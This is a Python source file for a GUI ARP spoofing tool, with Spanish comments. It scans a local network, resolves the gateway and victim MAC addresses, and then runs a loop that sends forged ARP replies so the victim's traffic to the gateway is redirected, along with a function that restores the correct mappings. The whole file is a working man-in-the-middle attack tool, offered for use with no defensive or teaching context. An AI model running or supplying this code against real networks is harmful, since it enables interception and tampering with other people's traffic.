from multiprocessing import Process
from scapy.all import ARP, Ether, send, srp
from tkinter import ttk
from tkinter import messagebox

import ipaddress
import customtkinter as ctk
import netifaces
import time


def ip_gateway():
    try:
        gws = netifaces.gateways()
        return gws['default'][netifaces.AF_INET][0]
    except Exception:
        return None

gateway = ip_gateway()

def network_host():
    net = spoof.network_entry.get()
    tree = spoof.tree

    if not net:
        messagebox.showwarning("Warning", "Enter NETWORK ADDRESS")
        return

    try:
        network = ipaddress.IPv4Network(net, strict=False)
    except ValueError:
        messagebox.showwarning("Warning", "Invalid NETWORK ADDRESS")
        return

    tree.delete(*tree.get_children())

    p = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(network))
    resp, _ = srp(p, timeout=2, verbose=False)

    for _, r in resp:
        pair = (r[ARP].psrc, r[ARP].hwsrc)
        tree.insert("", "end", values=pair)


def mac_gateway():
    if not gateway:
        return None
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op="who-has", pdst=gateway)
    resp, _ = srp(packet, retry=10, timeout=5, verbose=False)

    if resp:
        for _, r in resp:
            return r[Ether].src
    return None


def mac_victim():
    target = spoof.target.get()
    if not target:
        messagebox.showerror("Warning", "Invalid IP ADDRESS")
        return None

    try:
        ipaddress.IPv4Address(target)
    except ValueError:
        messagebox.showerror("Warning", "Invalid IP ADDRESS")
        return None

    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op="who-has", pdst=target)
    resp, _ = srp(packet, timeout=5, retry=10, verbose=False)

    if resp:
        for _, r in resp:
            return r[Ether].src
    return None


def restore():
    victim_ip = spoof.target.get()
    if not victim_ip:
        messagebox.showwarning("Warning", "Invalid IP ADDRESS")
        return

    try:
        ipaddress.IPv4Address(victim_ip)
    except ValueError:
        messagebox.showwarning("Warning", "Invalid IP ADDRESS")
        return

    m_gw = mac_gateway()
    m_vic = mac_victim()

    if not m_gw or not m_vic:
        messagebox.showerror("Error", "No se pudieron obtener las MACs")
        return

    send(ARP(op=2, psrc=gateway, hwsrc=m_gw, pdst=victim_ip, hwdst=m_vic), count=5, verbose=False)
    send(ARP(op=2, psrc=victim_ip, hwsrc=m_vic, pdst=gateway, hwdst=m_gw), count=5, verbose=False)
    messagebox.showinfo("Info", "Red restaurada")


def poison(victim_ip, m_gw, m_vic):
    if not victim_ip:
        return

    try:
        ipaddress.IPv4Address(victim_ip)
    except ValueError:
        return

    poison_victim = ARP(op=2, psrc=gateway, pdst=victim_ip, hwdst=m_vic)
    poison_gateway = ARP(op=2, psrc=victim_ip, pdst=gateway, hwdst=m_gw)

    while True:
        try:
            send(poison_victim, verbose=False)
            send(poison_gateway, verbose=False)
            time.sleep(2)
        except Exception:
            break

#Controlamos el ataque
is_running = False
poison_process = False

def run():
    global poison_process, is_running
    victim_ip = spoof.target.get()
    if not victim_ip:
        messagebox.showwarning("Warning", "Enter IP Victim")
        return

    try:
        ipaddress.IPv4Address(victim_ip)
    except ValueError:
        messagebox.showwarning("Warning", "Invalid IP ADDRESS")
        return

    m_gw = mac_gateway()
    m_vic = mac_victim()

    if not m_gw or not m_vic:
        messagebox.showerror("Error", "No se pudieron resolver las MACs")
        return

    poison_process = True
    is_running = True

    if poison_process and is_running:
        poison_process = Process(target=poison, args=(victim_ip, m_gw, m_vic))
        poison_process.start()
        messagebox.showinfo("Info", "Ataque iniciado")
        spoof.run_spoof.configure(state="disabled")
        spoof.stop_spoof.configure(state="normal")

def stop_spoof():
    global poison_process, is_running

    if poison_process:
        poison_process.terminate()
        poison_process.join()

    restore()
    is_running = False
    poison_process = False

    spoof.run_spoof.configure(state="normal")
    spoof.stop_spoof.configure(state="disabled")


# INTERFAZ

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("green")

class Spoof:
    def __init__(self, root):
        self.root = root
        self.root.geometry("600x500+450+250")
        self.root.title("ARP Spoofing")

        styles = ttk.Style(root)
        styles.theme_use("clam")

        styles.configure("Treeview", background="#050505", foreground="#39FF14", fieldbackground="#050505", rowheight=30, font=("Consolas", 11))

        styles.configure("Treeview.Heading", background="#101010", foreground="#00FF00", font=("Consolas", 11, "bold"))

        # Dirección de RED
        ctk.CTkLabel(root, text="Network Address:", font=("Arial", 14)).place(x=50, y=30)
        self.network_entry = ctk.CTkEntry(root, width=350)
        self.network_entry.place(x=200, y=30)

        # IP Victima
        ctk.CTkLabel(root, text="IP Victim:", font=("Arial", 14)).place(x=50, y=75)
        self.target = ctk.CTkEntry(root, width=350)
        self.target.place(x=200, y=75)

        # Opciones
        self.run_spoof = ctk.CTkButton(root, text="Run Spoof", command=run)
        self.run_spoof.place(x=60, y=130)

        self.stop_spoof = ctk.CTkButton(root, text="Stop Spoof", command=stop_spoof)
        self.stop_spoof.place(x=230, y=130)
        self.stop_spoof.configure(state="disabled")

        self.scan_net = ctk.CTkButton(root, text="Scan Network", command=network_host)
        self.scan_net.place(x=400, y=130)

        # Tabla
        self.tree = ttk.Treeview(root, columns=("IP", "MAC"), show="headings")
        self.tree.place(x=30, y=190, width=520, height=280)

        self.tree.heading("IP", text="IP Address")
        self.tree.heading("MAC", text="MAC Address")

        self.tree.column("IP", width=250, anchor="center")
        self.tree.column("MAC", width=280, anchor="center")

        # Scrollbar
        self.scrollbar = ttk.Scrollbar(root, orient="vertical", command=self.tree.yview)
        self.scrollbar.place(x=550, y=190, width=20, height=280)

        self.tree.configure(yscrollcommand=self.scrollbar.set)

if __name__ == "__main__":
    root = ctk.CTk()
    spoof = Spoof(root)
    root.mainloop()
